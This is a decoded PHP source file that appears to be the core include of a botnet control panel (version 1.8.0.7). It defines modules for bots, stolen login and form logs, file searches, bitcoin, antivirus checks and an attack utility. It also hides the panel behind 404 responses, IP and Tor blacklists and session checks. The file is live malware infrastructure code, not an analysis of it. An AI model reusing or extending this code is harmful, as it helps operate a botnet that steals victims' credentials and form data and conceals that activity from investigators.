<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

define("CONTROL_PANEL_VERSION", "1.8.0.7");
define("IN_CORE_INC", 1);
define("PAGE_INDEX", "index.php");
define("PAGE_LOGIN", "login.php");
define("MOD_EXTENSION", ".php");
define("MOD_MAIN", "main");
define("MOD_TASKS", "tasks");
define("MOD_STATS", "stats");
define("MOD_VIEW_BOT", "viewbot");
define("MOD_LOGS_LOGINS", "logins");
define("MOD_LOGS_FORMS", "forms");
define("MOD_LOGS_FILESEARCH", "filesearch");
define("MOD_HELP", "help");
define("MOD_BITCOIN", "bitcoin");
define("MOD_SETTINGS_USERS", "suser");
define("MOD_SETTINGS_ALERTS", "notices");
define("MOD_SETTINGS_AVCHECK", "avcheck");
define("MOD_SETTINGS_PANEL", "spanel");
define("MOD_SETTINGS_DYNAMIC_CONFIG", "sconfig");
define("MOD_SETTINGS_PLUGINS", "plugins");
define("MOD_SETTINGS_WEB", "web");
define("MOD_SETTINGS_DEBUG", "debug");
define("GATE_LOG_FILENAME", "gate_err.txt");
define("DIR_MODULES", "mods");
define("DIR_TASKS", "tasks");
define("DIR_EXPORTS", "exports");
define("DIR_FLAGS", "img/flags");
define("DIR_FILES", "files");
define("DNS_MOD_FILE", "dns.dat");
$bIsInstanceUtility = false;
error_reporting(1 | 4);
$_SERVER["REMOTE_ADDR"] = _obfuscated_0D2E1121191905230A131E07330907400B5C2D35142B11_();
if (17 < strlen($_SERVER["REMOTE_ADDR"])) {
    $_SERVER["REMOTE_ADDR"] = "0.0.0.0";
}
$_CLIENT_GEO_CODE2 = "";
if (!defined("IN_UPDATETORIPS") && @file_exists("settings.php") == false) {
    exit("Setup required.");
}
if (strstr($_SERVER["SCRIPT_NAME"], "/atk.php")) {
    $bIsInstanceUtility = true;
}
require "settings.php";
require "include/cache.inc";
require "include/utility.inc";
require "include/sql.inc";
$sqlDefault = new CSqlWrap();
$main_sql_link = NULL;
if (!defined("IN_BOT_GATEWAY")) {
    $main_sql_link = $sqlDefault->Connect();
}
require "include/session.inc";
require "include/panel_settings.inc";
require "include/bot.inc";
require "include/tasks.inc";
require "include/page.inc";
require "include/plugins.inc";
date_default_timezone_set("America/Louisville");
$sqlTasks = new CTasks();
$sqlGeoIP = new CGeoIP();
$sqlBlacklist = new CPanelBlacklist();
$sqlSettings = new CPanelSettings();
$mCache = new CMemoryCache();
if ($mCache->Initialize()) {
    $sqlSettings->GetSettingsFromCache();
}
$Session = NULL;
if (!defined("IN_BOT_GATEWAY") && $bIsInstanceUtility == false) {
    _obfuscated_0D2E030502393309353803265C180F1810281B0E1C1D22_($main_sql_link);
    $sqlSettings->GetSettings();
    if (!defined(DISABLE_SQLI_PROTECTION) && $sqlSettings->Flags_Security & SECURITY_FLAGS_BLACKLIST_PROACTIVE_ENABLED && $sqlBlacklist->CheckStringForAttackString($_SERVER["QUERY_STRING"]) == true) {
        if (!defined("IN_BOT_GATEWAY")) {
            $sqlBlacklist->AddBlacklistedIP(ip2long($_SERVER["REMOTE_ADDR"]), BLACKLIST_REASON_SQLI);
        }
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
    if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_BLACKLIST_TOR && 0 < $sqlBlacklist->IsTORIP(ip2long($_SERVER["REMOTE_ADDR"]))) {
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
    if ($sqlSettings->Flags_Security & SECURITY_FLAGS_BLACKLIST_ENABLED && $sqlBlacklist->IsIPBlacklisted(ip2long($_SERVER["REMOTE_ADDR"]))) {
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
    session_set_cookie_params(24 * 5 * 60 * 60);
    $sqlDefault->SetEncoding("utf8");
    require_once "include/worldmap.inc";
    $Session = new CPanelSession($main_sql_link);
    $Session->Start();
    if (!defined("IN_LOGIN_FORM") && $Session->ValidateSessionLoginInformation() == false) {
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
} else {
    if ($bIsInstanceUtility == true) {
        _obfuscated_0D2E030502393309353803265C180F1810281B0E1C1D22_($main_sql_link);
        $sqlSettings->GetSettings();
    }
}
function _obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_($ip)
{
    if (!empty($ip) && ip2long($ip) != -1 && ip2long($ip) != false) {
        $_obfuscated_0D1A3304260934380E1E0904041F2B0423131E371A2B22_ = array(array("0.0.0.0", "2.255.255.255"), array("10.0.0.0", "10.255.255.255"), array("127.0.0.0", "127.255.255.255"), array("169.254.0.0", "169.254.255.255"), array("172.16.0.0", "172.31.255.255"), array("192.0.2.0", "192.0.2.255"), array("192.168.0.0", "192.168.255.255"), array("255.255.255.0", "255.255.255.255"));
        foreach ($_obfuscated_0D1A3304260934380E1E0904041F2B0423131E371A2B22_ as $_obfuscated_0D28142E3B062F271A102F0613403C3D2E093D3B1A3511_) {
            $min = ip2long($_obfuscated_0D28142E3B062F271A102F0613403C3D2E093D3B1A3511_[0]);
            $max = ip2long($_obfuscated_0D28142E3B062F271A102F0613403C3D2E093D3B1A3511_[1]);
            if ($min <= ip2long($ip) && ip2long($ip) <= $max) {
                return false;
            }
        }
        return true;
    } else {
        return false;
    }
}
function _obfuscated_0D2E1121191905230A131E07330907400B5C2D35142B11_()
{
    if (isset($_SERVER["HTTP_CLIENT_IP"]) && _obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_($_SERVER["HTTP_CLIENT_IP"])) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        foreach (explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]) as $ip) {
            if (_obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_(trim($ip))) {
                return $ip;
            }
        }
    }
    if (isset($_SERVER["HTTP_X_FORWARDED"]) && _obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_($_SERVER["HTTP_X_FORWARDED"])) {
        return $_SERVER["HTTP_X_FORWARDED"];
    }
    if (isset($_SERVER["HTTP_X_CLUSTER_CLIENT_IP"]) && _obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_($_SERVER["HTTP_X_CLUSTER_CLIENT_IP"])) {
        return $_SERVER["HTTP_X_CLUSTER_CLIENT_IP"];
    }
    if (isset($_SERVER["HTTP_FORWARDED_FOR"]) && _obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_($_SERVER["HTTP_FORWARDED_FOR"])) {
        return $_SERVER["HTTP_FORWARDED_FOR"];
    }
    if (isset($_SERVER["HTTP_FORWARDED"]) && _obfuscated_0D1A37080F350338080C1A0F160325132D3108311D0F01_($_SERVER["HTTP_FORWARDED"])) {
        return $_SERVER["HTTP_FORWARDED"];
    }
    return $_SERVER["REMOTE_ADDR"];
}
function _obfuscated_0D2E030502393309353803265C180F1810281B0E1C1D22_($sql_ilink)
{
    global $sqlTasks;
    global $sqlGeoIP;
    global $sqlBlacklist;
    global $sqlSettings;
    $sqlTasks->SetInternalLink($sql_ilink);
    $sqlGeoIP->SetInternalLink($sql_ilink);
    $sqlBlacklist->SetInternalLink($sql_ilink);
    $sqlSettings->SetInternalLink($sql_ilink);
}
function _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_($err_code, $err_string, $output_anyways = false)
{
    global $sqlSettings;
    if ($output_anyways == false && ($sqlSettings->IsLoaded == false || !($sqlSettings->General_Options & GENERAL_OPTION_GATE_DEBUG_OUTPUT_ENABLED))) {
        return false;
    }
    if ($err_string == "") {
        return false;
    }
    $fp = @fopen(GATE_LOG_FILENAME, "a");
    if ($fp) {
        $_obfuscated_0D09102C3D070B03062304213933100C1725063B302E32_ = "(Err // #" . $err_code . " // " . $_SERVER["REMOTE_ADDR"] . " // " . date("m/d/Y h:i:s a", time()) . "]):  " . $err_string . "\r\n";
        @fwrite($fp, $_obfuscated_0D09102C3D070B03062304213933100C1725063B302E32_);
        @fclose($fp);
        return true;
    }
    return false;
}

?>